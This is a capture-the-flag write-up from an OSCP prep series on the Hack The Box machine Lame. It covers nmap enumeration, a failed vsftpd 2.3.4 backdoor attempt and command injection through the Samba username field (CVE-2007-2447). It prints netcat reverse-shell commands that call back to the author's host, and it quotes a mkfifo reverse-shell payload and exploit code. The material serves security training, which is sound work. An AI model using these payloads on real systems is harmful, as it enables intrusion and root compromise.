# Overview

This is the third box in my OSCP prep series.

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.3|2.6|Linux|2021-05-03|2021-05-03|

This box was also very simple, again only made harder by manual exploitation. It involved exploiting a CVE in SMB that allows command injection via the username field.

Unlike Legacy and Blue there were a couple of different services to look at. As I looked at FTP first, it took me a little longer to root as I spent some time trying to get that exploit working. Overall the box took me about 2 hours, but I learnt two exploits along the way.

## Ratings

I rated both user and root a 2 for difficulty, as there was a little more to them than just firing off metasploit at a single service, and the manual exploitation had a few different paths.

## nmap

We started with an `nmap` scan:

```bash

```

We have an FTP server, with anonymous login allowed. It also exposed a version name, `vsFTPd 2.3.4`.

We also have samba and SSH.

The scan exposed a domain name: `lame.hackthebox.gr`, and that the box was running on Ubuntu.

## Extra nmap

I set off a full port scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nmap -p- -Pn -oA nmap/all-ports 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 104.46 seconds
```

This returned one extra port, running `distccd`. I didn't exploit this, but [0xdf](https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html) has a nice writeup.

I also ran a vuln scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nmap --script vuln -Pn -oA nmap/vuln 10.10.10.3

|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 86.61 seconds
```

This gave nothing interesting.

# FTP Server

## Enumerating FTP Shares

I tried replicating the anonymous login:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:mac): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

This also exposed the FTP version name.

I tried listing files before doing anything else:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

There was nothing.

## Trying VSFTP Exploit

I ran a `searchsploit` against `vsftpd`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ searchsploit vsftpd

----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It seems there is a backdoor exploit for version 2.3.4. [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) gives a good overview on how it was introduced.

There was a metasploit module, which we don't want to use. I found a similar python exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ git clone https://github.com/ahervias77/vsftpd-2.3.4-exploit.git
```

The code doesn't seem to tell us much about how it works, but it looks like it uses a socket to setup a direct connection then supplies a command. It seems the code is exploiting a known backdoor that was introduced into the `vsftp` codebase.

Let's try a netcat reverse shell. First, setup a listener:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

Then attempt to send a shell with netcat back to our box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 'nc 10.10.14.13 9001 -e /bin/bash'
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

This hung for a while. I eventually terminated it and tried a simpler command.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 id
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

No luck.

## Trying the Exploit Manually

Instead, I tried to exploit it manually in case the exploit was broken. I followed a [great guide](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/) to do this, with a cool rundown of the exploit code:

![](/assets/images/blogs/Pasted image 20210503225240.png)

The exploit involves triggering the backdoor by connecting to port 21 and supplying a username suffixed with a smiley face `:)`. Then the backdoor should open on port 6200 and give you a shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 21
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
^]
telnet> Connection closed.
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 6200
Trying 10.10.10.3...
^C
```

The initial connection worked, but the shell didn't pop. We can also try with netcat:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
500 OOPS: priv_sock_get_result
```

No luck. Using `nmap` we can see the port isn't open:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nmap -Pn -p 6200 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:35 BST
Nmap scan report for 10.10.10.3
Host is up.

PORT     STATE    SERVICE
6200/tcp filtered lm-x

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

This suggests we probably can't use this exploit.

# SMB

## Enumerating SMB Shares

Time to look at SMB instead. We can first map the shares:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

The only one we can connect to is `tmp`. Trying gives us the following error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is because our config is setup not to connect to shares on older SMB versions for security reasons. We can change our config at `/etc/samba.smb.conf`, or we can supply a command line parameter so we don't make an insecure config change and forget to revert it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'

```

After all that, there was nothing interesting in the directory anyway. 

## SMB Exploit

So instead we can look at the version number in searchsploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ searchsploit Samba 3.0

...[snip]...

----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are a couple of exploits for the version we want. The remote heap overflow isn't clear how it should be executed, so even though we don't want to use metasploit I tried to look at the module to see how it works, using `searchsploit -x unix/remote/16320.rb`.

The metasploit module references [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447). This seems to be the key code:

```ruby
def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
				simple.client.negotiate(false)
				simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
				# nothing, it either worked or it didn't ;)
		end

		handler
end
```

It seems a payload should be supplied inside the username parameter when authenticating with SMB. Let's try to do so:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
nohup: ignoring input and redirecting stderr to stdout
```

We get a hit on our listener! But, strangely, it is from our box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.14.13] 37426
```

I did some googling, and it turns out backticks \` are executed by bash before the rest of the command ([according to Stack Exchange](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands)). This is used for command substitution, where the results are passed to bash.

I tried escaping the backticks this time - I also had to pass the extra parameter as I was getting the `NT_STATUS_CONNECTION_DISCONNECTED` error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=\`nohup nc 10.10.14.13 9001 -e /bin/bash\`" --option='client min protocol=NT1'
Enter =`NOHUP NC 10.10.14.13 9001 -E \bin/bash`'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

This was potentially progress, as it was no longer evaluating the command on my box - but it wasn't giving me a shell either.

It seemed to be capitalising the command. I wasn't sure how to fix this, so I looked for a PoC script.

## PoC

Googling "CVE 2007 2447 poc" gave me [this exploit](https://github.com/amriunix/CVE-2007-2447). I cloned it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ git clone https://github.com/amriunix/CVE-2007-2447.git
```

This exploit builds the following payload:

```python
payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
username = "/=`nohup " + payload + "`"
```

I grabbed the `pysmb` library:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/CVE-2007-2447]
└─$ /usr/bin/python2 -m pip install pysmb
```

Then executed:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/CVE-2007-2447]
└─$ python2 usermap_script.py 10.10.10.3 445 10.10.14.13 9001
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

Sure enough:

The shell pops us out as root, so we can grab both flags:

There's no fancy 'you rooted Lame' screen for this one, as we had already cracked this box on the SESH account. Either way, that's the box!

## Alternate Method

After reading [0xdf's writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html) I realised I could have used an alternate command to login to SMB after connecting, and supplied the payload there:

```bash
smb: \> logon "./=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
```
